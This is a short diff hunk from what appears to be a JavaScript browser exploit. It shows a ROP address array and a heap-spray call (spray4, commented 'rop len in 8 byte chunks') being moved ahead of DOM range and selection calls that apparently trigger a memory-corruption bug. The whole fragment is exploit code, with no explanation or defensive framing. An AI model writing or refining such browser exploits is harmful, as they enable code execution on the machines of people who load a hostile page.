@@ -26,12 +26,12 @@ rop = [0x83000000, 0x83000001, 0x83000002, 0x83000003, 0x83000004, 0x83000005, 0
 
 window.addEventListener("load", function () {
 
-    //spray4(0xa00);  //rop len in 8 byte chunks
+    spray4(300);  //rop len in 8 byte chunks
     var range = document.createRange();
     var selection = document.getSelection();
     range.setStart(m1, 0);
     range.setEnd(id1, id1.childNodes.length);
-	spray4(300);  //rop len in 8 byte chunks
+	//spray4(300);  //rop len in 8 byte chunks
 	alert("a");
     selection.addRange(range);
 	
